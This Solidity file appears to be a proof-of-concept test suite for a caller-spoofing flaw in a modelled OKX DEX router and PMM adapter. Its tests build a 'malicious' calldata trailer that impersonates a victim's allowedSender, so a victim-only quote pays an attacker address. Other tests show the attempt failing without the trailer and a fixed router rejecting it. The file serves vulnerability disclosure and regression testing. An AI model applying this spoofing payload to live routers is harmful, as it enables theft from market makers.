// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IAdapterEntry {
    function sellBase(address to, address pool, bytes memory moreInfo) external;
}

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public mover;
    address public immutable owner;

    constructor() { owner = msg.sender; }

    function setMover(address who, bool allowed) external {
        require(msg.sender == owner, "OWNER");
        mover[who] = allowed;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "OWNER");
        balanceOf[to] += amount;
    }

    function move(address from, address to, uint256 amount) external {
        require(mover[msg.sender], "MOVER");
        require(balanceOf[from] >= amount, "BALANCE");
        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
    }
}

contract PMMAdapterModel {
    struct Order {
        address maker;
        address allowedSender;
        MockToken makerToken;
        MockToken takerToken;
        uint256 makerAmount;
        uint256 takerAmount;
        bytes32 salt;
    }

    uint256 internal constant DEX_ROUTER_CALLER_MARKER =
        0x3ca20afc2ddd0000000000000000000000000000000000000000000000000000;
    uint256 internal constant MARKER_MASK =
        0xffffffffffff0000000000000000000000000000000000000000000000000000;
    uint256 internal constant ADDRESS_MASK =
        0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff;

    address public immutable trustedRouter;
    bytes32 public immutable expectedOrderHash;
    bytes32 public immutable expectedSignatureHash;
    address public lastExtractedCaller;
    address public lastTarget;

    constructor(address router, bytes32 orderHash, bytes32 signatureHash) {
        trustedRouter = router;
        expectedOrderHash = orderHash;
        expectedSignatureHash = signatureHash;
    }

    function sellBase(address to, address, bytes memory moreInfo) external {
        require(msg.sender == trustedRouter, "UNTRUSTED_ROUTER");

        // Mirrors PMMAdapter._PMMSwap: trailing bytes are not part of the decoded tuple.
        (bytes memory orderInfo, bytes memory makerSignature, uint256 signatureType, uint256 orderType) =
            abi.decode(moreInfo, (bytes, bytes, uint256, uint256));
        require(signatureType == 0 && orderType == 4, "MODE");
        require(keccak256(orderInfo) == expectedOrderHash, "ORDER_AUTH");
        require(keccak256(makerSignature) == expectedSignatureHash, "SIGNATURE_AUTH");

        Order memory order = abi.decode(orderInfo, (Order));
        address extracted = _extractDexRouterCaller();
        require(order.allowedSender != address(0) && extracted == order.allowedSender, "RFQ_BadSender");

        lastExtractedCaller = extracted;
        lastTarget = to;

        // Economic settlement: attacker funds the taker leg; maker asset goes to attacker target.
        order.takerToken.move(msg.sender, order.maker, order.takerAmount);
        order.makerToken.move(order.maker, to, order.makerAmount);
    }

    function _extractDexRouterCaller() internal pure returns (address caller) {
        assembly ("memory-safe") {
            let candidate := calldataload(sub(calldatasize(), 64))
            if eq(and(candidate, MARKER_MASK), DEX_ROUTER_CALLER_MARKER) {
                caller := and(candidate, ADDRESS_MASK)
            }
        }
    }
}

contract VulnerableRouterModel {
    uint256 internal constant ORIGIN_PAYER =
        0x3ca20afc2ccc0000000000000000000000000000000000000000000000000000;

    function execute(
        address adapter,
        address target,
        bytes memory moreInfo,
        address refundTo,
        MockToken takerToken,
        uint256 takerAmount
    ) external {
        // Model router-controlled input funding. In production the approved router claims from msg.sender.
        takerToken.move(msg.sender, adapter, takerAmount);
        (bool ok, bytes memory ret) = adapter.call(
            abi.encodePacked(
                abi.encodeWithSelector(IAdapterEntry.sellBase.selector, target, address(0), moreInfo),
                ORIGIN_PAYER | uint256(uint160(refundTo))
            )
        );
        if (!ok) assembly ("memory-safe") { revert(add(ret, 0x20), mload(ret)) }
    }
}

contract FixedRouterModel {
    uint256 internal constant DEX_ROUTER_CALLER_MARKER =
        0x3ca20afc2ddd0000000000000000000000000000000000000000000000000000;
    uint256 internal constant ORIGIN_PAYER =
        0x3ca20afc2ccc0000000000000000000000000000000000000000000000000000;

    function execute(
        address adapter,
        address target,
        bytes memory moreInfo,
        address refundTo,
        MockToken takerToken,
        uint256 takerAmount
    ) external {
        takerToken.move(msg.sender, adapter, takerAmount);
        (bool ok, bytes memory ret) = adapter.call(
            abi.encodePacked(
                abi.encodeWithSelector(IAdapterEntry.sellBase.selector, target, address(0), moreInfo),
                DEX_ROUTER_CALLER_MARKER | uint256(uint160(msg.sender)),
                ORIGIN_PAYER | uint256(uint160(refundTo))
            )
        );
        if (!ok) assembly ("memory-safe") { revert(add(ret, 0x20), mload(ret)) }
    }
}

contract OkxCallerTrailerTest {
    uint256 internal constant DEX_ROUTER_CALLER_MARKER =
        0x3ca20afc2ddd0000000000000000000000000000000000000000000000000000;
    uint256 internal constant ORIGIN_PAYER =
        0x3ca20afc2ccc0000000000000000000000000000000000000000000000000000;
    uint256 internal constant MARKER_MASK =
        0xffffffffffff0000000000000000000000000000000000000000000000000000;
    uint256 internal constant ADDRESS_MASK =
        0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff;

    address internal constant MAKER = address(0xA11CE);
    address internal constant VICTIM_ALLOWED_SENDER = address(0xBEEF);
    address internal constant ATTACKER_TARGET = address(0xCAFE);
    address internal constant REFUND_TO = address(0xD00D);
    uint256 internal constant MAKER_AMOUNT = 100 ether;
    uint256 internal constant TAKER_AMOUNT = 200 ether;

    function _fixture(address router)
        private
        returns (
            MockToken makerToken,
            MockToken takerToken,
            PMMAdapterModel adapter,
            PMMAdapterModel.Order memory order,
            bytes memory signature,
            bytes memory canonical,
            bytes memory malicious
        )
    {
        makerToken = new MockToken();
        takerToken = new MockToken();
        order = PMMAdapterModel.Order({
            maker: MAKER,
            allowedSender: VICTIM_ALLOWED_SENDER,
            makerToken: makerToken,
            takerToken: takerToken,
            makerAmount: MAKER_AMOUNT,
            takerAmount: TAKER_AMOUNT,
            salt: keccak256("victim-only-quote")
        });
        bytes memory orderInfo = abi.encode(order);
        signature = hex"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20";
        adapter = new PMMAdapterModel(router, keccak256(orderInfo), keccak256(signature));
        makerToken.setMover(address(adapter), true);
        takerToken.setMover(router, true);
        takerToken.setMover(address(adapter), true);
        makerToken.mint(MAKER, MAKER_AMOUNT);
        takerToken.mint(address(this), TAKER_AMOUNT * 4);
        canonical = abi.encode(orderInfo, signature, uint256(0), uint256(4));
        malicious = abi.encodePacked(
            canonical,
            DEX_ROUTER_CALLER_MARKER | uint256(uint160(VICTIM_ALLOWED_SENDER))
        );
    }

    function test_EndToEndVictimOnlyQuoteExecutesForAttackerAndPaysAttackerTarget() public {
        VulnerableRouterModel router = new VulnerableRouterModel();
        (
            MockToken makerToken,
            MockToken takerToken,
            PMMAdapterModel adapter,
            PMMAdapterModel.Order memory unusedOrder,
            bytes memory unusedSignature,
            bytes memory unusedCanonical,
            bytes memory malicious
        ) = _fixture(address(router));

        uint256 makerBefore = makerToken.balanceOf(MAKER);
        uint256 attackerBefore = makerToken.balanceOf(ATTACKER_TARGET);
        uint256 takerBefore = takerToken.balanceOf(address(this));

        router.execute(address(adapter), ATTACKER_TARGET, malicious, REFUND_TO, takerToken, TAKER_AMOUNT);

        require(adapter.lastExtractedCaller() == VICTIM_ALLOWED_SENDER, "CALLER_NOT_SPOOFED");
        require(adapter.lastTarget() == ATTACKER_TARGET, "TARGET_NOT_ATTACKER");
        require(makerToken.balanceOf(MAKER) == makerBefore - MAKER_AMOUNT, "MAKER_ASSET_NOT_DEBITED");
        require(makerToken.balanceOf(ATTACKER_TARGET) == attackerBefore + MAKER_AMOUNT, "ATTACKER_NOT_CREDITED");
        require(takerToken.balanceOf(address(this)) == takerBefore - TAKER_AMOUNT, "ATTACKER_NOT_CHARGED");
        require(takerToken.balanceOf(MAKER) == TAKER_AMOUNT, "MAKER_NOT_PAID");
    }

    function test_NoTrailerFailsClosedAndMovesNoFunds() public {
        VulnerableRouterModel router = new VulnerableRouterModel();
        (
            MockToken makerToken,
            MockToken takerToken,
            PMMAdapterModel adapter,
            PMMAdapterModel.Order memory unusedOrder,
            bytes memory unusedSignature,
            bytes memory canonical,
            bytes memory unusedMalicious
        ) = _fixture(address(router));
        uint256 makerBefore = makerToken.balanceOf(MAKER);
        uint256 attackerTakerBefore = takerToken.balanceOf(address(this));
        (bool ok,) = address(router).call(
            abi.encodeWithSelector(
                router.execute.selector,
                address(adapter), ATTACKER_TARGET, canonical, REFUND_TO, takerToken, TAKER_AMOUNT
            )
        );
        require(!ok, "NO_TRAILER_ACCEPTED");
        require(makerToken.balanceOf(MAKER) == makerBefore, "MAKER_FUNDS_MOVED");
        require(makerToken.balanceOf(ATTACKER_TARGET) == 0, "ATTACKER_CREDITED");
        require(takerToken.balanceOf(address(this)) == attackerTakerBefore, "TAKER_CHARGED");
    }

    function test_WrongMarkerFailsClosed() public {
        VulnerableRouterModel router = new VulnerableRouterModel();
        (
            MockToken makerToken,
            MockToken takerToken,
            PMMAdapterModel adapter,
            PMMAdapterModel.Order memory unusedOrder,
            bytes memory unusedSignature,
            bytes memory canonical,
            bytes memory unusedMalicious
        ) = _fixture(address(router));
        bytes memory wrong = abi.encodePacked(
            canonical,
            ORIGIN_PAYER | uint256(uint160(VICTIM_ALLOWED_SENDER))
        );
        (bool ok,) = address(router).call(
            abi.encodeWithSelector(
                router.execute.selector,
                address(adapter), ATTACKER_TARGET, wrong, REFUND_TO, takerToken, TAKER_AMOUNT
            )
        );
        require(!ok, "WRONG_MARKER_ACCEPTED");
        require(makerToken.balanceOf(ATTACKER_TARGET) == 0, "ATTACKER_CREDITED");
    }

    function test_FixedRouterBindsActualCallerAndRejectsSpoof() public {
        FixedRouterModel router = new FixedRouterModel();
        (
            MockToken makerToken,
            MockToken takerToken,
            PMMAdapterModel adapter,
            PMMAdapterModel.Order memory unusedOrder,
            bytes memory unusedSignature,
            bytes memory unusedCanonical,
            bytes memory malicious
        ) = _fixture(address(router));
        uint256 makerBefore = makerToken.balanceOf(MAKER);
        uint256 attackerTakerBefore = takerToken.balanceOf(address(this));
        (bool ok,) = address(router).call(
            abi.encodeWithSelector(
                router.execute.selector,
                address(adapter), ATTACKER_TARGET, malicious, REFUND_TO, takerToken, TAKER_AMOUNT
            )
        );
        require(!ok, "FIXED_ROUTER_ACCEPTED_SPOOF");
        require(makerToken.balanceOf(MAKER) == makerBefore, "FIX_MOVED_MAKER_FUNDS");
        require(makerToken.balanceOf(ATTACKER_TARGET) == 0, "FIX_CREDITED_ATTACKER");
        require(takerToken.balanceOf(address(this)) == attackerTakerBefore, "FIX_CHARGED_TAKER");
    }

    function testFuzz_UserSuffixOccupiesMinus64AndDecodedPayloadIsUnchanged(
        bytes32 orderEntropy,
        bytes32 signatureEntropy,
        address victim,
        address refundTo,
        address receiver
    ) public pure {
        if (victim == address(0)) victim = address(1);
        bytes memory orderInfo = abi.encode(orderEntropy, victim, uint256(orderEntropy));
        bytes memory signature = abi.encodePacked(signatureEntropy, bytes1(0x1b));
        bytes memory canonical = abi.encode(orderInfo, signature, uint256(0), uint256(4));
        bytes memory malicious = abi.encodePacked(
            canonical,
            DEX_ROUTER_CALLER_MARKER | uint256(uint160(victim))
        );
        bytes memory externalCall = abi.encodePacked(
            abi.encodeWithSelector(IAdapterEntry.sellBase.selector, receiver, address(0), malicious),
            ORIGIN_PAYER | uint256(uint160(refundTo))
        );
        uint256 minus64 = _wordAtMinus64(externalCall);
        require((minus64 & MARKER_MASK) == DEX_ROUTER_CALLER_MARKER, "MARKER_MISS");
        require(address(uint160(minus64 & ADDRESS_MASK)) == victim, "VICTIM_MISS");
        (bytes memory a, bytes memory b, uint256 c, uint256 d) =
            abi.decode(malicious, (bytes, bytes, uint256, uint256));
        require(keccak256(a) == keccak256(orderInfo), "ORDER_MUTATED");
        require(keccak256(b) == keccak256(signature), "SIGNATURE_MUTATED");
        require(c == 0 && d == 4, "MODE_MUTATED");
    }

    function _wordAtMinus64(bytes memory payload) private pure returns (uint256 word) {
        require(payload.length >= 64, "SHORT");
        assembly ("memory-safe") {
            word := mload(add(add(payload, 0x20), sub(mload(payload), 64)))
        }
    }
}
